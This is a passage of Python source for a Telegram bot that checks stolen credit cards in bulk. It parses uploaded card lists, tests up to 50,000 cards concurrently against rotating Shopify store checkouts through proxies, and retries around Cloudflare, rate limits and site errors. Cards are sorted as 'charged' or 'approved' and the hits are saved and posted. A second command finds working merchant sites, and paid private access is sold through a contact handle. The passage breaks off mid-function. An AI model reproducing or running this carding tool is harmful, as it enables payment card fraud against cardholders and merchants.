        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        else: await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_ranfor_cards(event, cards, global_sites.copy()))
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def process_ranfor_cards(event, cards, global_sites):
    """/ran - Full MTXT jaisa + Instant Hit Send - 50K SUPPORT"""
    user_id = event.sender_id
    total = len(cards)
    
    # 50k MAX LIMIT
    if total > 50000:
        cards = cards[:50000]
        await event.reply("⚠️ **50k MAX LIMIT** - Processing first 50,000 CCs only.")

    checked = approved = charged = declined = 0
    status_msg = await event.reply(f"```🔥 𝙍𝘼𝙉 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎 (50k MAX)```")

    bin_cache = {}
    semaphore = asyncio.Semaphore(60)   # Increased for speed

    RETRY_TRIGGERS = [
        "merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom",
        "invalid json response", "delivery_delivery_line_detail_changed", "status: 401", "site error",
        "no working site found", "products", "cloudflare", "bypass failed", "expecting value", "json",
        "401", "positive_amount_expected", "rate limit", "too many requests", "429", "403", "timeout",
        "site requires login", "site not supported", "cart failed with status 503", "connection error",
        "failed to get session token", "payment method not available", "invalid_payment_method",
        "<b>Site Error! Status: 402</b>", "delivery_address", "<b>not shopify!</b>",
        "no valid payment method found", "processing_error", "Cart failed with status 422", 
        "payments_payment_flexibility_terms_id_mismatch", "SITE DEAD", "site dead"
    ]

    async def check_single_card(card):
        nonlocal checked, approved, charged, declined
        if user_id not in ACTIVE_MTXT_PROCESSES:
            return

        attempts = 0
        max_attempts = 12
        sites_tried = set()

        while attempts < max_attempts:
            attempts += 1
            available_sites = [s for s in global_sites if s not in sites_tried]
            if not available_sites:
                sites_tried.clear()
                available_sites = global_sites[:]

            current_site = random.choice(available_sites)
            sites_tried.add(current_site)

            async with semaphore:
                try:
                    result = await check_card_specific_site(card, current_site, user_id)
                    if user_id not in ACTIVE_MTXT_PROCESSES:
                        return
                    checked += 1
                    response_text = str(result.get("Response", "")).lower()

                    should_retry = any(trigger.lower() in response_text for trigger in RETRY_TRIGGERS)

                    if should_retry and attempts < max_attempts:
                        checked -= 1
                        await asyncio.sleep(0.02)
                        continue

                    bin_num = card.split("|")[0]
                    if bin_num not in bin_cache:
                        bin_cache[bin_num] = await get_bin_info(bin_num)
                    brand, bin_type, level, bank, country, flag = bin_cache[bin_num]

                    elapsed_time = round(random.uniform(0.9, 2.6), 2)

                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                    is_hit = False

                    # === INSTANT HIT DETECTION ===
                    if any(x in response_text for x in ["charged", "order placed", "order completed", "payment successful", "💎", "insufficient_funds"]):
                        charged += 1
                        status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                        is_hit = True
                        await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    elif any(x in response_text for x in ["otp_required", "incorrect_cvc", "requires_action", "3d", "3ds", "approved", "success", "payment accepted"]):
                        approved += 1
                        status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                        is_hit = True
                        await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    else:
                        declined += 1

                    # === TURANT HIT BHEJ DO ===
                    if is_hit:
                        short_site = current_site.replace("https://", "").replace("http://", "").split('/')[0]
                        card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝙚𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Shopify')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}
𝗣𝗿𝙞𝙘𝙚 ⇾ {result.get('Price')} 💸
𝗦𝗶𝙩𝗲 ⇾ {short_site}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝙣𝙠: {bank}
𝗖𝙤𝙪𝙣𝙩𝙧𝙮: {country} {flag}```

𝗧𝗼𝗼𝙺 {elapsed_time} 𝘀𝗲𝙘𝙤𝙣𝙙𝙨
"""
                        result_msg = await event.reply(card_msg)
                        if "CHARGED" in status_header:
                            await pin_charged_message(event, result_msg)

                    # Live Progress
                    price = result.get("Price", "N/A")
                    try:
                        price = f"${float(price):.2f}"
                    except:
                        pass

                    percent = min(round((checked / total) * 100, 1), 100)
                    blocks = 15
                    filled = int((checked / total) * blocks)
                    bar = "█" * filled + "░" * (blocks - filled)

                    status_text = f"""💳 `{card[:12]}****`
╭────────────────────
├ ```📩 Resp ➜ {result.get('Response')}```
├ 💲 {price} 
├ 💎 Charged ➜ {charged}
├ ✅ Approved ➜ {approved}
├ ❌ Declined ➜ {declined}
╰ 📊 {bar} {percent}% ({checked}/{total})
"""
                    buttons = [
                        [Button.inline(f"💎 𝗖𝗛𝗔𝗥𝗚𝗘𝘿 • {charged}", b"none")],
                        [Button.inline(f"✅ 𝗔𝗣𝙋𝗥𝙊𝙑𝙀𝘿 • {approved}", b"none")],
                        [Button.inline("🛑 𝗦𝗧𝗢𝗣", f"stop_ranfor:{user_id}".encode())]
                    ]

                    if checked % 20 == 0 or checked == total:
                        try:
                            await status_msg.edit(status_text, buttons=buttons)
                        except:
                            pass

                    break

                except Exception as e:
                    if attempts < max_attempts:
                        await asyncio.sleep(0.1)
                        continue
                    checked += 1
                    declined += 1
                    break

    try:
        tasks = [check_single_card(card) for card in cards]
        await asyncio.gather(*tasks, return_exceptions=True)
        if user_id not in ACTIVE_MTXT_PROCESSES:
            await event.reply("⛔ MTXT Stopped.")
            return        
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"**✅ RAN CHECK FINISHED - 50K SUPPORT**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")

    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"**⚠️ CHECK ENDED**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")

    # Yeh line bahar thi, ab sahi jagah (loop ke baad)

async def check_card_with_retries_ranfor(card, site, user_id, global_sites, max_retries=3):
    """Check a card with automatic retry up to max_retries times on site errors"""
    last_result = None
    
    for attempt in range(max_retries):
        result = await check_card_specific_site(card, site, user_id)
        
        # Check if site is dead
        if is_site_dead(result.get("Response", "")):
            # Don't remove sites from global_sites for /ran command
            # Just try with a new random site
            
            # If no more sites available, return dead
            if not global_sites:
                return {"Response": "All sites dead", "Price": "-", "Gateway": "Shopify", "Status": "Dead"}
            
            # Try with a new random site (without removing the dead one)
            site = random.choice(global_sites)
            last_result = result
            
            # Add a small delay before retry (except on last attempt)
            if attempt < max_retries - 1:
                await asyncio.sleep(0.5)
        else:
            # If no site error, return the result immediately
            return result
    
    # If all attempts failed with site errors, return as dead
    if last_result:
        return {"Response": f"Site errors on all attempts: {last_result.get('Response', 'Unknown')}", "Price": last_result.get('Price', '-'), "Gateway": "Shopify", "Status": "Dead"}
    
    # Fallback (should never reach here)
    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "Shopify", "Status": "Dead"}

@client.on(events.CallbackQuery(pattern=rb"stop_ranfor:(\d+)"))
async def stop_ranfor_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: can_stop = True
        elif clicking_user_id in ADMIN_ID: can_stop = True
        if not can_stop: return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e: await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)



@client.on(events.NewMessage(pattern=r'(?i)^[/.]check'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned":
        return await event.reply(banned_user_message())

    if not can_access:
        buttons = [
            [Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/alonechacha")]
        ]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)

    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")

    check_text = event.raw_text[6:].strip()

    if not check_text:
        buttons = [
            [Button.inline("🔍 𝘾𝙝𝙚𝙘𝙠 𝙈𝙮 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨", b"check_db_sites")]
        ]

        instruction_text = """🔍 **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠𝙚𝙧**

𝙄𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙨𝙞𝙩𝙚𝙨 𝙩𝙝𝙚𝙣 𝙩𝙮𝙥𝙚:

`/check`
`1. https://example.com`
`2. https://site2.com`
`3. https://site3.com`

𝘼𝙣𝙙 𝙞𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨 𝙖𝙣𝙙 𝙖𝙙𝙙 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 & 𝙧𝙚𝙢𝙤𝙫𝙚 𝙣𝙤𝙩 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙡𝙞𝙘𝙠 𝙗𝙚𝙡𝙤𝙬 𝙗𝙪𝙩𝙩𝙤𝙣:"""

        return await event.reply(instruction_text, buttons=buttons)

    sites_to_check = extract_urls_from_text(check_text)

    if not sites_to_check:
        return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!\n\n💡 𝙀𝙭𝙖𝙢𝙥𝙡𝙚:\n`/check`\n`1. https://example.com`\n`2. site2.com`")

    total_sites_found = len(sites_to_check)
    if len(sites_to_check) > 10:
        sites_to_check = sites_to_check[:10]
        await event.reply(f"```⚠️ 𝙁𝙤𝙪𝙣𝙙 {total_sites_found} 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 10 𝙨𝙞𝙩𝙚𝙨```")

    asyncio.create_task(process_site_check(event, sites_to_check))

async def process_site_check(event, sites):
    """Process site checking in background"""
    total_sites = len(sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_msg = await event.reply(f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {total_sites} 𝙨𝙞𝙩𝙚𝙨...```")

    batch_size = 10
    for i in range(0, len(sites), batch_size):
        batch = sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site, user_id=event.sender_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            # Check if proxy is dead - stop checking and notify user
            if result["status"] == "proxy_dead":
                final_text = f"""⚠️ **𝙋𝙧𝙤𝙭𝙮 𝘿𝙚𝙖𝙙!**

{result['response']}

📊 **𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 𝘽𝙚𝙛𝙤𝙧𝙚 𝙎𝙩𝙤𝙥:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}
📝 𝘾𝙝𝙚𝙘𝙠𝙚𝙙: {checked}/{total_sites}"""
                try:
                    await status_msg.edit(final_text)
                except:
                    await event.reply(final_text)
                return

            if result["status"] == "working":
                working_sites.append({"site": site, "price": result["price"]})
            else:
                dead_sites.append({"site": site, "price": result["price"]})

            working_count = len(working_sites)
            dead_count = len(dead_sites)
            
            working_sites_text = ""
            if working_sites:
                working_sites_text = "✅ **Working Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(working_sites, 1)]
                ) + "\n"
            dead_sites_text = ""
            if dead_sites:
                dead_sites_text = "❌ **Dead Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(dead_sites, 1)]
                ) + "\n"

            status_text = (
                f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨...\n\n"
                f"📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]\n"
                f"✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}\n"
                f"❌ 𝘿𝙚𝙖𝙙: {dead_count}\n\n"
                f"🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}\n"
                f"📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}\n"
                f"💰 𝙋𝙧𝙞𝙘𝙚: {result['price']}\n"
                f"```\n"
            )
            if working_sites_text or dead_sites_text:
                status_text += working_sites_text + dead_sites_text

            try:
                await status_msg.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.1)

    final_text = f"""✅ **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}

"""
    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    buttons = []
    if working_sites:
        # Store working sites in temporary dict with user_id as key
        TEMP_WORKING_SITES[event.sender_id] = [site_data['site'] for site_data in working_sites]
        buttons.append([Button.inline("➕ 𝘼𝙙𝙙 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨 𝙩𝙤 𝘿𝘽", f"add_working:{event.sender_id}".encode())])

    try:
        await status_msg.edit(final_text, buttons=buttons)
    except:
        await event.reply(final_text, buttons=buttons)

# Button callback handlers
@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id

    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])

    if not user_sites:
        return await event.answer("❌ 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙨𝙞𝙩𝙚𝙨 𝙮𝙚𝙩!", alert=True)

    await event.answer("🔍 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝘿𝘽 𝙨𝙞𝙩𝙚 𝙘𝙝𝙚𝙘𝙠...", alert=False)

    asyncio.create_task(process_db_site_check(event, user_sites))

async def process_db_site_check(event, user_sites):
    """Check user's DB sites and remove dead ones"""
    user_id = event.sender_id
    total_sites = len(user_sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_text = f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {total_sites} 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨...```"
    await event.edit(status_text)

    batch_size = 10
    for i in range(0, len(user_sites), batch_size):
        batch = user_sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site, user_id=user_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            # Check if proxy is dead - stop checking and notify user
            if result["status"] == "proxy_dead":
                final_text = f"""⚠️ **𝙋𝙧𝙤𝙭𝙮 𝘿𝙚𝙖𝙙!**

{result['response']}

📊 **𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 𝘽𝙚𝙛𝙤𝙧𝙚 𝙎𝙩𝙤𝙥:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}
📝 𝘾𝙝𝙚𝙘𝙠𝙚𝙙: {checked}/{total_sites}"""
                try:
                    await event.edit(final_text)
                except:
                    pass
                return

            if result["status"] == "working":
                working_sites.append(site)
            else:
                dead_sites.append(site)

            working_count = len(working_sites)
            dead_count = len(dead_sites)

            status_text = f"""```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨...

📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]
✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}
❌ 𝘿𝙚𝙖𝙙: {dead_count}

🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}
📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}```"""

            try:
                await event.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.1)

    if dead_sites:
        sites_data = await load_json(SITE_FILE)
        sites_data[str(user_id)] = working_sites
        await save_json(SITE_FILE, sites_data)

    final_text = f"""✅ **𝘿𝘽 𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙): {len(dead_sites)}

"""

    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site}`\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙):**\n"
        for idx, site in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site}`\n"

    try:
        await event.edit(final_text)
    except:
        pass

@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())

        if event.sender_id != callback_user_id:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙖𝙙𝙙 𝙨𝙞𝙩𝙚𝙨 𝙛𝙧𝙤𝙢 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙘𝙝𝙚𝙘𝙠!", alert=True)

        # Get working sites from temporary storage
        working_sites = TEMP_WORKING_SITES.get(callback_user_id, [])
        
        if not working_sites:
            return await event.answer("❌ 𝙉𝙤 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨 𝙛𝙤𝙪𝙣𝙙! 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙪𝙣 /𝙘𝙝𝙚𝙘𝙠 𝙖𝙜𝙖𝙞𝙣.", alert=True)

        sites_data = await load_json(SITE_FILE)
        user_sites = sites_data.get(str(callback_user_id), [])

        added_sites = []
        already_exists = []

        for site in working_sites:
            if site not in user_sites:
                user_sites.append(site)
                added_sites.append(site)
            else:
                already_exists.append(site)

        sites_data[str(callback_user_id)] = user_sites
        await save_json(SITE_FILE, sites_data)
        
        # Clear temporary storage after adding
        TEMP_WORKING_SITES.pop(callback_user_id, None)

        response_parts = []
        if added_sites:
            added_text = f"✅ **𝘼𝙙𝙙𝙚𝙙 {len(added_sites)} 𝙉𝙚𝙬 𝙎𝙞𝙩𝙚𝙨:**\n"
            for site in added_sites:
                added_text += f"• `{site}`\n"
            response_parts.append(added_text)

        if already_exists:
            exists_text = f"⚠️ **{len(already_exists)} 𝙎𝙞𝙩𝙚𝙨 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩:**\n"
            for site in already_exists:
                exists_text += f"• `{site}`\n"
            response_parts.append(exists_text)

        if response_parts:
            response_text = "\n".join(response_parts)
            response_text += f"\n📊 **𝙏𝙤𝙩𝙖𝙡 𝙎𝙞𝙩𝙚𝙨 𝙞𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽:** {len(user_sites)}"
        else:
            response_text = "ℹ️ 𝘼𝙡𝙡 𝙨𝙞𝙩𝙚𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙞𝙣 𝙮𝙤𝙪𝙧 𝘿𝘽!"

        await event.answer("✅ 𝙎𝙞𝙩𝙚𝙨 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙!", alert=False)

        current_text = event.message.text
        updated_text = current_text + f"\n\n🔄 **𝙐𝙥𝙙𝙖𝙩𝙚:**\n{response_text}"

        try:
            await event.edit(updated_text, buttons=None)
        except:
            await event.respond(response_text)

    except Exception as e:
        await event.answer(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}", alert=True)

@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unauth {user_id}")

        user_id = int(parts[1])

        if not await is_premium_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙙𝙤𝙚𝙨 𝙣𝙤𝙩 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!")

        success = await remove_premium_user(user_id)

        if success:
            await event.reply(f"✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}!")

            try:
                await client.send_message(user_id, f"⚠️ 𝙔𝙤𝙪𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨 𝙃𝙖𝙨 𝘽𝙚𝙚𝙣 𝙍𝙚𝙫𝙤𝙠𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙞𝙣𝙦𝙪𝙞𝙧𝙞𝙚𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙖𝙘𝙘𝙚𝙨𝙨 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}")

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /ban {user_id}")

        user_id = int(parts[1])

        if await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙖𝙣𝙣𝙚𝙙!")

        await remove_premium_user(user_id)
        await ban_user(user_id, event.sender_id)

        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙖𝙣𝙣𝙚𝙙!")

        try:
